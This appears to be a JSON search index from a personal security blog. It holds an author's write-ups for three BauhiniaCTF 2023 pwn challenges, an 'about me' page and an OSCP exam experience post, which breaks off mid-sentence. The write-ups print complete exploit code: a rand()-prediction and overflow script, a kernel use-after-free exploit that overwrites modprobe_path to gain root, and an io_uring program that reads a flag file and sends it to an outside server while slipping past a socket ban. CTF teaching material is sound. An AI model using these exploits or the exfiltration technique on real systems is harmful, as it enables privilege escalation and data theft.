
{
    
    
    
    
        
    
        
    
        
    
        
    
        
    
        
    
    "pages": [{"date":"2023-08-20","image":"","link":"https://bott0n.github.io/posts/bauhiniactf2023-author-writeups/","summary":"BauhiniaCTF 2023 Author Writeups of my challenges","tags":["ctf"],"text":"introduction in bauhinia ctf 2023, i have created 3 pwn challenge: god of gamblers, kernpass, and disconnect.\nin this post, i will show you the author writeups and the intended solution of those challenges.\nhope you enjoyed the challenges.\ngod of gamblers (50 points / 45 solves) this challenge is aimed for beginner-friendly which doesn\u0026rsquo;t require much exploit skill and technique. the challenging point is to understand that it is easy to predict the random value gerenarted by srand(time(0)) and rand(), and a little bit buffer overflow. in this challenge, only the stripped binary provided. here is the source code:\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;time.h\u0026gt; void init() { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); alarm(60); } void tournament() { file *fp; unsigned long guess; unsigned long random_number; // open /dev/urandom for reading  fp = fopen(\u0026#34;/dev/urandom\u0026#34;, \u0026#34;r\u0026#34;); if (fp == null) { printf(\u0026#34;error opening /dev/urandom.\\n\u0026#34;); exit(1); } // read 4 bytes from /dev/urandom into the random_number variable  fread(\u0026amp;random_number, sizeof(unsigned long), 1, fp); // close /dev/urandom  fclose(fp); // do something with the random number  printf(\u0026#34;now you enter the charity gamble tournament\\n\u0026#34;); printf(\u0026#34;this is the final round\\n\u0026#34;); printf(\u0026#34;win the flag or lose the game\\n\u0026#34;); printf(\u0026#34;enter your guess:\u0026#34;); scanf(\u0026#34;%s\u0026#34;, \u0026amp;guess); if (guess == random_number) { printf(\u0026#34;you are the god of gamblers!\\n\u0026#34;); printf(\u0026#34;here is your flag!\\n\u0026#34;); win(); } else { printf(\u0026#34;you lose!\u0026#34;); } return 0; } void win(){ file *fp; char flag[40];; // open the file for reading  fp = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); if (fp == null) { printf(\u0026#34;error opening file.\\n\u0026#34;); exit(1); } fread(\u0026amp;flag, 40, 1, fp); printf(\u0026#34;%s\u0026#34;, flag); } int main() { int dice1, dice2, dice3, points, guess, result, bet; int balance = 20; // initialize the player\u0026#39;s balance to 20  int goal = 25000000; // set the goal to 25,000,000  init(); srand(time(null)); // seed the random number generator with the current time  printf(\u0026#34;welcome to the dice game!\\n\u0026#34;); printf(\u0026#34;you have $%d to start with. the goal is to reach $%d.\\n\u0026#34;, balance, goal); while (balance \u0026lt; goal) { // as long as the player has not reached the goal  printf(\u0026#34;enter your bet (or enter 0 to quit): \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;bet); if (bet \u0026lt;= 0) { break; // exit the loop if the player chooses to quit  } if (bet \u0026gt; balance) { printf(\u0026#34;you don\u0026#39;t have enough money to place that bet.\\n\u0026#34;); continue; // go back to the top of the loop to ask for a valid bet  } printf(\u0026#34;enter 1 for small or 2 for big: \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;guess); dice1 = rand() % 6 + 1; // generate a random number between 1 and 6 for each die  dice2 = rand() % 6 + 1; dice3 = rand() % 6 + 1; points = dice1 + dice2 + dice3; // add up the points from the three dice  // determine if the result is small or big  if (points \u0026gt;= 3 \u0026amp;\u0026amp; points \u0026lt;= 9) { result = 1; // small  } else { result = 2; // big  } // determine the winner  if (guess == result) { balance += bet; // player wins  printf(\u0026#34;congratulations, you win $%d!\\n\u0026#34;, bet); } else { balance -= bet; // player loses  printf(\u0026#34;sorry, you lose $%d.\\n\u0026#34;, bet); } printf(\u0026#34;the result is %d (dice 1: %d, dice 2: %d, dice 3: %d).\\n\u0026#34;, points, dice1, dice2, dice3); printf(\u0026#34;your balance is now $%d.\\n\u0026#34;, balance); } if (balance \u0026gt;= goal) { printf(\u0026#34;congratulations, you have reached the goal of $%d!\\n\u0026#34;, goal); tournament(); } else { printf(\u0026#34;thanks for playing! your final balance is $%d.\\n\u0026#34;, balance); } return 0; } there are two vulnerability in the program.\nvulnerability 1 run the progam, we will seee the goal is to win $25000000 from $20.\nwelcome to the dice game! you have $20 to start with. the goal is to reach $25000000. enter your bet (or enter 0 to quit): to play the game, we need to enter our bet and choose small or big\nenter your bet (or enter 0 to quit): 20 enter 1 for small or 2 for big: 2 sorry, you lose $20. the result is 6 (dice 1: 1, dice 2: 4, dice 3: 1). your balance is now $0. the result is combined by 3 dices. 3-9 is small and 10-18 is big. from the source code, we can found all the dices are gerneated from rand()\ndice1 = rand() % 6 + 1; // generate a random number between 1 and 6 for each die dice2 = rand() % 6 + 1; dice3 = rand() % 6 + 1; points = dice1 + dice2 + dice3; // add up the points from the three dice also, we knew the seed is based on time(0);\nsrand(time(null)); in view of that, we can use the same seed to predict the rand() result.\n# load the c standard library libc = ctypes.cdll(\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;) # define the argument and return types for srand libc.srand.argtypes = [ctypes.c_uint] # define the argument and return types for rand libc.rand.restype = ctypes.c_int # seed the random number generator with the current time libc.srand(int(time.time())) def guess(libc): # generate a random number between 1 and 6 r1 = libc.rand() % 6 + 1 r2 = libc.rand() % 6 + 1 r3 = libc.rand() % 6 + 1 print(r1,r2,r3) points = r1+r2+r3 if points \u0026gt;= 10: return 2 return 1 balance = 20 for i in range(21): sla(\u0026#34;enter your bet (or enter 0 to quit): \u0026#34;, str(balance)) sla(\u0026#34;enter 1 for small or 2 for big: \u0026#34;, str(guess(libc))) balance *= 2 vulnerability 2 with the above prediction, we are entered to the final stage.\nthis time, the challenge seems require us to guess the value from /dev/urandom.\n// open /dev/urandom for reading  fp = fopen(\u0026#34;/dev/urandom\u0026#34;, \u0026#34;r\u0026#34;); if (fp == null) { printf(\u0026#34;error opening /dev/urandom.\\n\u0026#34;); exit(1); } // read 4 bytes from /dev/urandom into the random_number variable  fread(\u0026amp;random_number, sizeof(unsigned long), 1, fp); // close /dev/urandom  fclose(fp); it seems a impossible task for me (maybe it just a piece of cake for crypto player)\nhowever, when we look closer, it use scanf(\u0026quot;%s\u0026quot;, \u0026amp;guess); to receive the guess and the random_number and the guess are next to each other. so, it is clear to know that, we can input 16 same bytes to pass it.\nexploit script from pwn import * import ctypes target = \u0026#39;./chall\u0026#39; #host = \u0026#34;127.0.0.1\u0026#34; #port = 9999 host = \u0026#39;chall.pwnable.hk\u0026#39; port = 20001 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 context.log_level = \u0026#39;debug\u0026#39; context.terminal = [\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] elf = elf(target) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(host, port) # libc = elf(\u0026#39;\u0026#39;) else: p = process(target) libc = elf.libc #--- helper functions s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=true :p.recvuntil(delims, drop) # misc functions uu32 = lambda data :u32(data.ljust(4, b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data :u64(data.ljust(8, b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{}= {:#x}\u0026#39;.format(name, addr)) #--- # load the c standard library libc = ctypes.cdll(\u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34;) # define the argument and return types for srand libc.srand.argtypes = [ctypes.c_uint] # define the argument and return types for rand libc.rand.restype = ctypes.c_int # seed the random number generator with the current time libc.srand(int(time.time())) def guess(libc): # generate a random number between 1 and 6 r1 = libc.rand() % 6 + 1 r2 = libc.rand() % 6 + 1 r3 = libc.rand() % 6 + 1 print(r1,r2,r3) points = r1+r2+r3 if points \u0026gt;= 10: return 2 return 1 balance = 20 for i in range(21): sla(\u0026#34;enter your bet (or enter 0 to quit): \u0026#34;, str(balance)) sla(\u0026#34;enter 1 for small or 2 for big: \u0026#34;, str(guess(libc))) balance *= 2 sl(\u0026#34;a\u0026#34;*16) p.interactive() kernpass (430 points / 10 solves) kernpass is a kernel pwn challenge. this is the first time i make a kernel pwn challegne, so it actually cost me so much time on compiling kernel, busybox and kernel module debugging. to be honest, this is the very time for me to create a kernel pwnchallenge, amount of terrible permission misconfiguration leads to several unintended solution. i apologize for that.\nthis challnege is a very classic \u0026ldquo;note-liked\u0026rdquo; heap challenge, it should be easy for the kernel pwn player. you may find that the challenge called \u0026ldquo;kernpass\u0026rdquo; but there are not any encryption or endcoding elements inside. in fact, in the very early stages of the idea, i did want to implement a complex encryption system on it. however, i found it difficult to solve on my own :( and the hard deadline is coming soon. so i keep it simple.\ni think it is a light work for kernel pwn player to reverse it, so i decided to provide the kernel module only.\nhere is the source code of the kernel module:\n#include \u0026lt;linux/cdev.h\u0026gt;#include \u0026lt;linux/fs.h\u0026gt;#include \u0026lt;linux/kernel.h\u0026gt;#include \u0026lt;linux/module.h\u0026gt;#include \u0026lt;linux/random.h\u0026gt;#include \u0026lt;linux/slab.h\u0026gt;#include \u0026lt;linux/uaccess.h\u0026gt; module_license(\u0026#34;gpl\u0026#34;); module_author(\u0026#34;botton\u0026#34;); module_description(\u0026#34;kernpass\u0026#34;); #define device_name \u0026#34;kernpass\u0026#34; #define add_pw 0x13370001 #define chk_pw 0x13370002 #define edit_pw 0x13370003 #define del_pw 0x13370004  typedef struct { unsigned int index; unsigned int size; char *password; } request_t; typedef struct { unsigned int size; char *password; } password_entity; typedef struct { password_entity *passwords[0x20]; } password_list; password_list* main_list; static int add_password(request_t* req) { unsigned int index; unsigned int size; char *password; password_entity *tmp_entity; index = req-\u0026gt;index; size = req-\u0026gt;size; password = req-\u0026gt;password; if (index \u0026gt;= 0 \u0026amp;\u0026amp; index \u0026lt; 0x20 \u0026amp;\u0026amp; size \u0026lt;= 512) { tmp_entity = (password_entity*)kmalloc(sizeof(password_entity), gfp_kernel_account); tmp_entity-\u0026gt;size = size; tmp_entity-\u0026gt;password = (char *)kmalloc(size, gfp_kernel_account); if (unlikely(copy_from_user(tmp_entity-\u0026gt;password, password, size))){ kfree(tmp_entity); return -1; } main_list-\u0026gt;passwords[index] = tmp_entity; } else { return -1; } return 0; } static int check_password(request_t* req) { unsigned int index; unsigned int size; char *password; password_entity *tmp_entity; index = req-\u0026gt;index; password = req-\u0026gt;password; if (index \u0026gt;= 0 \u0026amp;\u0026amp; index \u0026lt; 0x20) { if (main_list-\u0026gt;passwords[index]){ tmp_entity = main_list-\u0026gt;passwords[index]; size = tmp_entity-\u0026gt;size; if (unlikely(copy_to_user(password, tmp_entity-\u0026gt;password, size))){ return -1; } } else { return -1; } } else { return -1;; } return 0; } static int edit_password(request_t* req) { unsigned int index; unsigned int size; char *password; password_entity *tmp_entity; index = req-\u0026gt;index; password = req-\u0026gt;password; if (index \u0026gt;= 0 \u0026amp;\u0026amp; index \u0026lt; 0x20) { if (main_list-\u0026gt;passwords[index]){ tmp_entity = main_list-\u0026gt;passwords[index]; size = tmp_entity-\u0026gt;size; if (unlikely(copy_from_user(tmp_entity-\u0026gt;password, password, size))){ return -1; } } else { return -1; } } else { return -1; } return 0; } static int delete_password(request_t* req) { unsigned int index; index = req-\u0026gt;index; if (index \u0026gt;= 0 \u0026amp;\u0026amp; index \u0026lt; 0x20) { kfree(main_list-\u0026gt;passwords[index]-\u0026gt;password); kfree(main_list-\u0026gt;passwords[index]); main_list-\u0026gt;passwords[index] = 0; } else{ return -1; } return 0; } static int module_open(struct inode *inode, struct file *filp) { main_list = (password_list*)kmalloc(sizeof(password_list), gfp_kernel_account); return 0; } static int module_close(struct inode *inode, struct file *filp) { return 0; } static long module_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { request_t req; if (unlikely(copy_from_user(\u0026amp;req, (void*)arg, sizeof(req)))) return -1; switch (cmd) { case add_pw: return add_password(\u0026amp;req); case chk_pw: return check_password(\u0026amp;req); case edit_pw: return edit_password(\u0026amp;req); case del_pw: return delete_password(\u0026amp;req); default: return -1; } } static struct file_operations module_fops = { .owner = this_module, .open = module_open, .release = module_close, .unlocked_ioctl = module_ioctl }; static dev_t dev_id; static struct cdev c_dev; static int __init module_initialize(void) { if (alloc_chrdev_region(\u0026amp;dev_id, 0, 1, device_name)) return -ebusy; cdev_init(\u0026amp;c_dev, \u0026amp;module_fops); c_dev.owner = this_module; if (cdev_add(\u0026amp;c_dev, dev_id, 1)) { unregister_chrdev_region(dev_id, 1); return -ebusy; } main_list = (password_list*)kmalloc(sizeof(password_list), gfp_kernel_account); return 0; } static void __exit module_cleanup(void) { cdev_del(\u0026amp;c_dev); unregister_chrdev_region(dev_id, 1); } module_init(module_initialize); module_exit(module_cleanup); vulnerability the intended vulnerability of the challenge is race condition to cause uaf. we can see it has not implemented mutex in the source code and it enabled userfaultfd for normal user from /init.\necho 1 \u0026gt; /proc/sys/vm/unprivileged_userfaultfd uaf - leak kernel address we can follow the following steps to leak kernel address\nthread 1:\n create a 0x20 size password, password #0 register a uffd page check password #0 using the uffd page to trigger page fault  thread 2 start:\ndelete password #0 spray seq_operations kmalloc-32 heap spray  thread 2 end, thread 1 continue\nit return the data of seq_operations struture which reveal the kernel address. we can calculate the kernel base address by finding the offset manuelly.\nuaf - arbitrary address write primitive (aaw) as the structure size of password_entity 0x10, we are able to retrieve aaw through heap chunk overlapping.\nthread 1:\n create a 0x10 size password, password #0 register a uffd page edit password #0 using the uffd page to trigger page fault and prepare the address to write data in  thread 2 start:\ndelete password #0 create two 0x20 size password, password #2 \u0026amp; #3  thread 2 end, thread 1 continue\nthe pointer in password #3 will be overwritten with the address that we prepared in step3  the easiest way to become root with knowing kernel base address and having aaw is to modify modprobe_path.\ntherefore, we put our path to modprobe_path address by aaw to exploit it and get the flag.\nexploit script #define _gnu_source #include \u0026lt;assert.h\u0026gt;#include \u0026lt;fcntl.h\u0026gt;#include \u0026lt;linux/userfaultfd.h\u0026gt;#include \u0026lt;poll.h\u0026gt;#include \u0026lt;pthread.h\u0026gt;#include \u0026lt;signal.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;sys/ioctl.h\u0026gt;#include \u0026lt;sys/mman.h\u0026gt;#include \u0026lt;sys/syscall.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;sys/ipc.h\u0026gt; #define add_pw 0x13370001 #define chk_pw 0x13370002 #define edit_pw 0x13370003 #define del_pw 0x13370004  cpu_set_t pwn_cpu; int fd; unsigned long kheap; unsigned long kbase; void *page; char *buf; int uffd_stage = 0; int spray[0x50]; typedef struct { unsigned int index; unsigned int size; char *password; } request_t; typedef struct { unsigned int size; char *password; } password_entity; typedef struct { password_entity *passwords[0x20]; } password_list; int add_password(unsigned int index, unsigned int size, char *pw){ //printf(\u0026#34;add\\n\u0026#34;);  request_t req; memset(\u0026amp;req, \u0026#39;\\0\u0026#39;, sizeof(request_t)); req.index = index; req.size = size; req.password = pw; int ret = ioctl(fd, add_pw, \u0026amp;req); if (ret \u0026lt; 0) die(\u0026#34;add\u0026#34;); //printf(\u0026#34;created #%d\\n\u0026#34;, ret);  return ret; } int check_password(unsigned int index, char *pw){ //printf(\u0026#34;add\\n\u0026#34;);  request_t req; memset(\u0026amp;req, \u0026#39;\\0\u0026#39;, sizeof(request_t)); req.index = index; req.size = 0; req.password = pw; int ret = ioctl(fd, chk_pw, \u0026amp;req); if (ret \u0026lt; 0) die(\u0026#34;check password\u0026#34;); //printf(\u0026#34;created #%d\\n\u0026#34;, ret);  return ret; } int edit_password(unsigned int index, char *pw){ //printf(\u0026#34;add\\n\u0026#34;);  request_t req; memset(\u0026amp;req, \u0026#39;\\0\u0026#39;, sizeof(request_t)); req.index = index; req.size = 0; req.password = pw; int ret = ioctl(fd, edit_pw, \u0026amp;req); if (ret \u0026lt; 0) die(\u0026#34;edit\u0026#34;); //printf(\u0026#34;created #%d\\n\u0026#34;, ret);  return ret; } int delete_password(unsigned int index){ //printf(\u0026#34;add\\n\u0026#34;);  request_t req; memset(\u0026amp;req, \u0026#39;\\0\u0026#39;, sizeof(request_t)); req.index = index; req.size = 0; req.password = 0; int ret = ioctl(fd, del_pw, \u0026amp;req); if (ret \u0026lt; 0) die(\u0026#34;reset\u0026#34;); //printf(\u0026#34;created #%d\\n\u0026#34;, ret);  return ret; } int die(char *text){ printf(\u0026#34;die: %s\\n\u0026#34;, text); exit(-1); } int hexdump(char *target, int size){ for (int i=0; i\u0026lt;size/8; i++){ if (*(unsigned long*)(target+(i*8)) != 0){ printf(\u0026#34;0x%x: 0x%lx\\n\u0026#34;, i*8, *(unsigned long*)(target+(i*8))); } } } int uffd_stage1(){ puts(\u0026#34;[+] uaf read\u0026#34;); delete_password(0); for (int i=0; i \u0026lt; 0x50; i++){ seq_open(); } } int uffd_stage2(){ puts(\u0026#34;[+] uaf write\u0026#34;); delete_password(0); add_password(2, 0x20, buf); add_password(3, 0x20, buf); } static void* fault_handler_thread(void *arg) { char *dummy_page; static struct uffd_msg msg; struct uffdio_copy copy; struct pollfd pollfd; long uffd; static int fault_cnt = 0; uffd = (long)arg; dummy_page = mmap(null, 0x1000, prot_read | prot_write, map_private | map_anonymous, -1, 0); if (dummy_page == map_failed) die(\u0026#34;mmap(dummy)\u0026#34;); puts(\u0026#34;[+] fault_handler_thread: waiting for page fault...\u0026#34;); pollfd.fd = uffd; pollfd.events = pollin; while (poll(\u0026amp;pollfd, 1, -1) \u0026gt; 0) { if (pollfd.revents \u0026amp; pollerr || pollfd.revents \u0026amp; pollhup) die(\u0026#34;poll\u0026#34;); /* trigger page fault */ if (read(uffd, \u0026amp;msg, sizeof(msg)) \u0026lt;= 0) die(\u0026#34;read(uffd)\u0026#34;); assert (msg.event == uffd_event_pagefault); printf(\u0026#34;[+] uffd: flag=0x%llx\\n\u0026#34;, msg.arg.pagefault.flags); printf(\u0026#34;[+] uffd: addr=0x%llx\\n\u0026#34;, msg.arg.pagefault.address); if (uffd_stage == 0){ uffd_stage1(); } else if (uffd_stage == 1){ uffd_stage2(); } uffd_stage++; //----------------------------------------------  copy.src = (unsigned long)buf; copy.dst = (unsigned long)msg.arg.pagefault.address; copy.len = 0x1000; copy.mode = 0; copy.copy = 0; if (ioctl(uffd, uffdio_copy, \u0026amp;copy) == -1) die(\u0026#34;ioctl(uffdio_copy)\u0026#34;); } return null; } int register_uffd(void *addr, size_t len) { /* uffd template from https://pawnyable.cafe/ */ struct uffdio_api uffdio_api; struct uffdio_register uffdio_register; long uffd; pthread_t th; /* register userfaultfd */ uffd = syscall(__nr_userfaultfd, o_cloexec | o_nonblock); if (uffd == -1) die(\u0026#34;userfaultfd\u0026#34;); uffdio_api.api = uffd_api; uffdio_api.features = 0; if (ioctl(uffd, uffdio_api, \u0026amp;uffdio_api) == -1) die(\u0026#34;ioctl(uffdio_api)\u0026#34;); /* register uffd page */ uffdio_register.range.start = (unsigned long)addr; uffdio_register.range.len = len; uffdio_register.mode = uffdio_register_mode_missing; if (ioctl(uffd, uffdio_register, \u0026amp;uffdio_register) == -1) die(\u0026#34;uffdio_register\u0026#34;); /* create thread when page fault */ if (pthread_create(\u0026amp;th, null, fault_handler_thread, (void*)uffd)) die(\u0026#34;pthread_create\u0026#34;); return 0; } int seq_open() { int seq; if ((seq=open(\u0026#34;/proc/self/stat\u0026#34;, o_rdonly))==-1) { puts(\u0026#34;[x] seq open error\u0026#34;); exit(0); } return seq; } int main(){ system(\u0026#34;echo -ne \u0026#39;#!/bin/sh\\n/bin/cp /root/flag.txt /tmp/flag.txt\\n/bin/chmod 777 /tmp/flag.txt\u0026#39; \u0026gt; /tmp/x\u0026#34;); system(\u0026#34;chmod +x /tmp/x\u0026#34;); system(\u0026#34;echo -ne \u0026#39;\\\\xff\\\\xff\\\\xff\\\\xff\u0026#39; \u0026gt; /tmp/crash\u0026#34;); system(\u0026#34;chmod +x /tmp/crash\u0026#34;); char *master_pw; buf = malloc(0x3000); cpu_zero(\u0026amp;pwn_cpu); cpu_set(0, \u0026amp;pwn_cpu); if (sched_setaffinity(0, sizeof(cpu_set_t), \u0026amp;pwn_cpu)) die(\u0026#34;sched_setaffinity\u0026#34;); // open device  fd = open(\u0026#34;/dev/kernpass\u0026#34;, o_rdwr); if (fd == -1) die(\u0026#34;open device failed\u0026#34;); // prepare uffd  page = mmap(null, 0x3000, prot_read | prot_write, map_private | map_anonymous, -1, 0); register_uffd(page, 0x3000); // leak kbase  memset(buf, \u0026#39;a\u0026#39;, 0x20); add_password(0, 0x20, buf); check_password(0, page); hexdump(page, 0x100); kbase = *(unsigned long*)(page+0x8) - 0x4148d0; printf(\u0026#34;[+] kbase: 0x%llx\\n\u0026#34;, kbase); // overlap chunk  memset(buf, \u0026#39;a\u0026#39;, 0x10); add_password(0, 0x10, buf); // setup fake entity  *(unsigned long*)(buf) = 0x8; *(unsigned long*)(buf+0x8) = kbase + 0x1a8be80; // trigger uaf  edit_password(0, page+0x2000); edit_password(3, \u0026#34;/tmp/x\u0026#34;); system(\u0026#34;/tmp/crash\u0026#34;); system(\u0026#34;cat /tmp/flag.txt\u0026#34;); return 0; } disconnect (500 points / 1 solve) the idea of this challenge is very simple, just banned socket syscall. players are required to get the flag without using socket syscall.\ni want to keep the challenge as lightweight as possible, i didn\u0026rsquo;t implement so much on the hardening and it surely possible to come up with several unintended solutions.\nin my team internal difficulty rating, we expected this would be a easy challenge for many expereinced pwners (especially kernel pwner) because of the hot topic of io_uring in kctf in recent years.\nwe are surprised that only one team solved it (an unintended solution from shellphish\u0026rsquo;s fork bomb with no mercy).\nintended solution https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html\nread this and you will find the anwser. io_uring_enter can used for performing i/o operation. one of the opcode is ioring_op_socket, it do the same as socket syscall\u0026quot;\nhttps://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html#ioring_op_socket\n issue the equivalent of a socket(2) system call. fd must contain the communication domain, off must contain the communication type, len must contain the protocol, and rw_flags is currently unused and must be set to zero. see also socket(2) for the general description of the related system call. available since 5.19.\n through strace the solve script, there is not a single word \u0026lsquo;socket\u0026rsquo; in the result.\nio_uring_setup(1, {flags=0, sq_thread_cpu=0, sq_thread_idle=0, sq_entries=1, cq_entries=2, features=ioring_feat_single_mmap|ioring_feat_nodrop|ioring_feat_submit_stable|ioring_feat_rw_cur_pos|ioring_feat_cur_pe4 mmap(null, 388, prot_read|prot_write, map_shared|map_populate, 4, 0) = 0x7f4004925000 mmap(null, 64, prot_read|prot_write, map_shared|map_populate, 4, 0x10000000) = 0x7f4004924000 io_uring_enter(4, 1, 0, 0, null, 8) = 1 the above snip is part of the strace result of a socket fd creation.\nonce we have a socket fd, the rest of stuffs are a piece of cake.\nopen flag -\u0026gt; read flag -\u0026gt; create io_uring socket -\u0026gt; connect to your public server or webhook -\u0026gt; send flag -\u0026gt; solved\nexploit script you can retrieve the flag via listening on your public accessible machine or webhook services (e.g. requestbin)\n solve.c\n #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;sys/socket.h\u0026gt;#include \u0026lt;netinet/in.h\u0026gt;#include \u0026lt;liburing.h\u0026gt; char *ip = \u0026#34;your public ip\u0026#34;; //change this int port = 58888; //change this  int main(int argc , char *argv[]) { struct io_uring ring; struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; char message[0x100]; char flag[0x100]; memset(message, 0, 0x100); memset(flag, 0, 0x100); int fd = open(\u0026#34;/flag.txt\u0026#34;, 0); read(fd , flag, 0x100); write(1, flag, 0x100); io_uring_queue_init(1, \u0026amp;ring, 0); sqe = io_uring_get_sqe(\u0026amp;ring); sqe-\u0026gt;opcode = ioring_op_socket; sqe-\u0026gt;fd = af_inet; sqe-\u0026gt;off = sock_stream; sqe-\u0026gt;len = 0;\tsqe-\u0026gt;rw_flags = 0; io_uring_submit(\u0026amp;ring); io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); int sockfd = cqe-\u0026gt;res; strcat(message, \u0026#34;get /\u0026#34;); strcat(message, flag); strcat(message, \u0026#34; http/1.1\\r\\n\u0026#34;); strcat(message, \u0026#34;connection: close\\r\\n\\r\\n\u0026#34;); // socket connection  struct sockaddr_in info; bzero(\u0026amp;info,sizeof(info)); info.sin_family = pf_inet; // ip \u0026amp; port  info.sin_addr.s_addr = inet_addr(ip); info.sin_port = htons(port); int err = connect(sockfd, (struct sockaddr *)\u0026amp;info, sizeof(info)); send(sockfd, message, 0x100,0); return 0; }  upload.py\n from pwn import * r = remote(\u0026#34;chall-us.pwnable.hk\u0026#34;, 20003) with open(\u0026#34;solve\u0026#34;, \u0026#39;rb\u0026#39;) as file: data = file.read() file_size = len(data) print(f\u0026#34;file size: {file_size}\u0026#34;) r.sendline(str(file_size)) sleep(1) print(\u0026#34;upload data\u0026#34;) r.send(data) sleep(10) ","title":"BauhiniaCTF 2023 Author Writeups"},{"date":"2023-07-31","image":"","link":"https://bott0n.github.io/about/aboutme/","summary":"","tags":[],"text":"introduction hong konger | 21 y/o | crtp \u0026amp; oscp | ctf player (pwn) | learning red team stuffs\nwriting blog posts to share or record my ctf writeups, experience, and useless research.\ncontact twitter: https://twitter.com/botton3310\ngithub: https://github.com/bott0n\ndiscord: @bott0n\nemail: bot3310ctf@gmail.com\n","title":"About me"},{"date":"2023-07-31","image":"","link":"https://bott0n.github.io/posts/my-experience-on-oscp/","summary":"A blog post about my experience on OSCP.","tags":[],"text":"introduction this is a blog post about my perosnal experience and sharing on oscp exam. i am currently a 21 y/o student. i started the oscp labs during my second semester of my fourth year at university and passed the oscp exam during the summer semester. i will share about my preparation and the things that i learned in this post. please note that the content may not be suitable for all viewers, depending on the different backgrounds, knowledge, or situations.\nmy background before starting oscp, i had two years of experience playing ctfs. although i am not a highly skilled or experienced player and primarily focus on pwn challenges, i have a limited knowledge of cybersecurity and coding. this foundational knowledge has given me an rough understanding of how a server works, at least in the context of a simple web server, as well as basic usage of the linux operating system.\nbeside, i passed the crtp in oct. 2022, it has given me the elementary idea of active direcotry.\nperparation labs and exercises i started the labs and exercises in jan., the 3 month period is completed overlaied with my 2nd semester schedule. as this is my last semster in the university, i have a huge workload on academy stuffs (final year project, assignments, quiz and exam, etc\u0026hellip;). therefore, i only played the labs and exercices for 1 month. i pwned around 39 machines and 80% or above progress on exercises in order to gain the 10 bonus point. to be honest, around 40% machines to be pwned are with the hints from discord server or forum. mst of stucking are bacuase my enumeration is not enough, only a bit is because my lacking knowledege or guessy stuffs.\nhackthebox after the end of the labs, i turned to learn at hackthebox. at the beginning, i simply play with the active machine and watching ippsec video becuase i am frustrated on my various academy deadlines. i spent one machine per day on watching ippsec video or 0xdf blog writeup according to the tjnull\u0026rsquo;s oscp liked hackthebox list.\noscp liked hackthebox: https://docs.google.com/spreadsheets/u/1/d/1dwsmiapiam0purbkcidi88pu3yzrqqhkdtbnguhncw8/htmlview#\nuntill a short break after the end of the semster. i decided to do these machines manually. i asked @mystiz to buy me the hackthebox gift card (whcih is the prize of hkcertctf 2023 writeup competition) to become vip to play the retired machine. i spent a month to play around on it and i realized my weekness is windows related machine and most of them are standalone machine. i moved to hackthebox active directory track. i didn\u0026rsquo;t complete all of machines in the track but i still learn a lot about active directory.\ndays before the exam in the days leading up to the exam, it is very important to ensure that all of your tools and scripts are properly prepared. it can be both avoidable and time-wasting to have to fix your tools in the exam environment. in view of that, i tested all tools and ensure all of them are worked properly and take a snapshot of the vm. also, i even downloaded a brand new kali vmware as the backups vm. since the preparation is finished, i am still seeking plenty of the oscp blogs, cheatsheet or hackthebox writeups in the internet for refreshing my knowledge or avoid any knowledge that i have missed.\nexam after finished the instruction of proctoring tool manual. i started the exam. at first, i started the enumeration on all ip that i have received. then i decieded to start with the ad set. in the first hour, i gained the administrator on the first machine and then stucking on the laterval movement. i moved my focus to other standalone machine.\nluckily, i rooted 2 standlone machines in 30 minutues and spent a hour on the last machine but still cannot getting the inital access. i gained 40+10 points at that time and there is two path left to pass the exam:\n(1) complete the ad machines set (2) root the last standalone machine\ni turned back to ad set and started to check which steps or information that i missed. i felt extremtly lost and frustrated because i throught i was already tried everythings. 4 hours later, fortunately, i found a important information that i just ignored before. finally, i compeleted the ad machines set after 30 minutes.\nwhen submitted the flag of last ad machine, i knew i has already passed the exam with 80+10 points. i chilled out and took a 3 hour break for dinner, shower and taking a nap. backing front of the computer, i didn\u0026rsquo;t start to try the last machine. i spent a hour on recording every steps in details and taking every snapshots that i properly needed in the report.\ni returned to the last machine and spent 4 hours on it. i still have no idea and 0 new progess on the inital access. (please forgive me for not try harder on it) finally, i ended the exam sessions in 12 hours and finished the report and uploaded it with 3 hours.\nafter 5 days, i recevied the oscp certificate.\nlessons i learned through this experience, i learned some lessons to help improve my skills.\nunderstand every command you type it\u0026rsquo;s not necessary to read the source code of every command you use, but having a rough idea of why you are using a particular command, what it does, what services are involved, and the expected result. this approach helped me to understand the attack flows instead of just copying and pasting commands without knowing what was happening.\ncreate your own cheatsheet/notes/mindset map whenever i learned a new tool, command, or trick, i added it to my own notes. this helped me to remember the different tools i had used and to use them again in similar situations. it also had a positive impact on my understanding of the enumeration or attack flow on various services or operating systems.\ndon\u0026rsquo;t be afraid to read writeups or seek help when i was working on machines in the oscp labs or on hackthebox, if i felt like i had tried every method i knew and wasn\u0026rsquo;t making any progress, i would read writeups or seek for hints without hesitation. sometimes, it maybe 